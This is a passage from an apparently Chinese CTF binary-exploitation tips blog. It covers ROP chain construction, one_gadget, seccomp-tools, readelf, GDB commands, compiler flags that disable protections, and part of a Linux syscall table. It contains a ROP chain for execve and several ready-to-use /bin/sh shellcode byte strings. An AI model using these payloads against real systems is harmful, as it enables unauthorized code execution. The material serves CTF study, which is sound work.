<span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x000000000049d0c0) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x000000000040a30d) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x000000000049d0c8) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000401858) <span class="comment"># pop rdx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x000000000049d0c8) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000417e25) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000450860) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, 0x0000000000401243) <span class="comment"># syscall</span></span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="onegadget">Onegadget</span></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">one_gadget  libc版本</span><br></pre></td></tr></table></figure>

<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(2)/3.png"></p>
<hr>
<h2><span id="seccomp">Seccomp</span></h2><p>存在沙箱，就需要注意两点，第一点就是return ALLOW（allow也就是允许可行），第二点就是return KILL（kill也就是杀死禁止）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">seccomp-tools dump ./文件名</span><br></pre></td></tr></table></figure>

<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(2)/4.png"></p>
<hr>
<h2><span id="readelf">readelf</span></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">readelf -S ./111 | grep bss     查看可读可写的bss段</span><br></pre></td></tr></table></figure>

<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(2)/5.png"></p>
<hr>
<h2><span id="shellcode">shellcode</span></h2><p>可以用工具编写shellcode（划重点，唯一需要注意的就是环境，不标注环境默认为32位的，让雨果遇到64位shellcode的题目，就需要标注环境，上面有自己翻）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>

<p>也可以自己找 <a href="https://www.exploit-db.com/">https://www.exploit-db.com</a> （根据题目的要求，选取适合的字节）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 32位 短字节shellcode --&gt; 21字节</span></span><br><span class="line">\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 32位 纯ascii字符shellcode</span></span><br><span class="line">PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 32位 scanf可读取的shellcode</span></span><br><span class="line">\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/bin/sh</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 64位 scanf可读取的shellcode 22字节</span></span><br><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 64位 较短的shellcode  23字节</span></span><br><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 64位 纯ascii字符shellcode</span></span><br><span class="line">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="gdb">GDB</span></h2><ul>
<li><strong>plt</strong>
查看 plt 表内容</li>
</ul>
<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(2)/6.png"></p>
<ul>
<li><strong>got</strong>
查看 got 表内容</li>
</ul>
<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(2)/7.png"></p>
<ul>
<li><strong>vmmap</strong>
vmmap – 可以用来查看栈、bss段是否可以执行</li>
</ul>
<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(2)/8.png"></p>
<ul>
<li><strong>distance</strong>
用于计算两地址的距离
<code>distance 地址 地址</code></li>
</ul>
<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(2)/9.png"></p>
<ul>
<li><strong>disassemble</strong>
用于查看某段代码的汇编指令
<code>disassemble 地址</code></li>
</ul>
<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(2)/10.png"></p>
<ul>
<li><strong>attach</strong>
调试
<code>gdb.attach(p)</code></li>
<li><strong>print</strong>
查看变量地址
<code>print 函数名</code></li>
</ul>
<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(2)/11.png"></p>
<hr>
<h2><span id="其他">其他</span></h2><p><strong>gcc命令生成可执行文件</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc &lt;c文件名&gt; -o &lt;生成的可执行文件名&gt;</span><br></pre></td></tr></table></figure>

<p><strong>gcc编译运行c文件（Linux系统）</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1、新建.c文件</span><br><span class="line">2、在当前目录下打开终端</span><br><span class="line">3、输入指令：</span><br><span class="line">   gcc  -c  文件名.c</span><br><span class="line">   gcc  文件名.o  -o 文件名</span><br><span class="line">   ./文件名</span><br></pre></td></tr></table></figure>

<p><strong>不开启PIE保护</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -fno-stack-protector -no-pie -s test.c -o <span class="built_in">test</span>  </span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="relro-x2f-stack-x2f-nx-x2f-pie">Relro &#x2F; Stack &#x2F; NX &#x2F; PIE</span></h2><ul>
<li><strong>Full Relro（重定位表只读）</strong>
Relocation Read Only， .got 和 .plt 只读</li>
<li><strong>No Canary found（能栈溢出）</strong></li>
<li><strong>NX enable（不可执行内存）</strong>
Non-Executable Memory</li>
<li><strong>PIE enable（开启ASLR 地址随机化）</strong>
Address space layout randomization</li>
</ul>
<hr>
<h1><span id="总结">总结：</span></h1><p>水平一直停滞不前，一直在原地踏步，放松心情，加油加油！！！</p>
]]></content>
      <categories>
        <category>技巧</category>
        <category>方法</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN PWN PWN !!! 技巧 (3)</title>
    <url>/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(3)/</url>
    <content><![CDATA[<p>PWN PWN PWN !!! 技巧 (3)</p>
<span id="more"></span>

<h1><span id="简介">简介：</span></h1><p><a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(1)/">PWN PWN PWN !!! 技巧 (1)</a></p>
<p><a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(3)/">PWN PWN PWN !!! 技巧 (2)</a></p>
<p>紧接上述技巧（1）和技巧（2），这期整理一些 Linux 系统调用号和一些编码的命令，记录一下。</p>
<hr>
<h2><span id="linux-系统调用号表">Linux 系统调用号表</span></h2><h3><span id="32-位">32 位</span></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _ASM_X86_UNISTD_32_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _ASM_X86_UNISTD_32_H 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_restart_syscall 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_exit 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fork 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_read 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_write 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_open 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_close 6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_waitpid 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_creat 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_link 9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_unlink 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_execve 11</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chdir 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_time 13</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mknod 14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chmod 15</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lchown 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_break 17</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_oldstat 18</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lseek 19</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpid 20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mount 21</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_umount 22</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setuid 23</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getuid 24</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_stime 25</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ptrace 26</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_alarm 27</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_oldfstat 28</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pause 29</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_utime 30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_stty 31</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_gtty 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_access 33</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_nice 34</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ftime 35</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sync 36</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kill 37</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rename 38</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mkdir 39</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rmdir 40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_dup 41</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pipe 42</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_times 43</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_prof 44</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_brk 45</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setgid 46</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getgid 47</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_signal 48</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_geteuid 49</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getegid 50</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_acct 51</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_umount2 52</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lock 53</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioctl 54</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fcntl 55</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mpx 56</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setpgid 57</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ulimit 58</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_oldolduname 59</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_umask 60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chroot 61</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ustat 62</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_dup2 63</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getppid 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpgrp 65</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setsid 66</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigaction 67</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sgetmask 68</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ssetmask 69</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setreuid 70</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setregid 71</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigsuspend 72</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigpending 73</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sethostname 74</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setrlimit 75</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getrlimit 76</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getrusage 77</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_gettimeofday 78</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_settimeofday 79</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getgroups 80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setgroups 81</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_select 82</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_symlink 83</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_oldlstat 84</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readlink 85</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_uselib 86</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_swapon 87</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_reboot 88</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readdir 89</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mmap 90</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munmap 91</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_truncate 92</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ftruncate 93</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchmod 94</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchown 95</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpriority 96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setpriority 97</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_profil 98</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_statfs 99</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstatfs 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioperm 101</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_socketcall 102</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_syslog 103</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setitimer 104</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getitimer 105</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_stat 106</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lstat 107</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstat 108</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_olduname 109</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_iopl 110</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vhangup 111</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_idle 112</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vm86old 113</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_wait4 114</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_swapoff 115</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sysinfo 116</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ipc 117</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fsync 118</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigreturn 119</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clone 120</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setdomainname 121</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_uname 122</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_modify_ldt 123</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_adjtimex 124</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mprotect 125</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigprocmask 126</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_create_module 127</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_init_module 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_delete_module 129</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_kernel_syms 130</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_quotactl 131</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpgid 132</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchdir 133</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_bdflush 134</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sysfs 135</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_personality 136</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_afs_syscall 137</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setfsuid 138</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setfsgid 139</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR__llseek 140</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getdents 141</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR__newselect 142</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_flock 143</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msync 144</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readv 145</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_writev 146</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsid 147</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fdatasync 148</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR__sysctl 149</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mlock 150</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munlock 151</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mlockall 152</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munlockall 153</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setparam 154</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getparam 155</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setscheduler 156</span></span><br><span 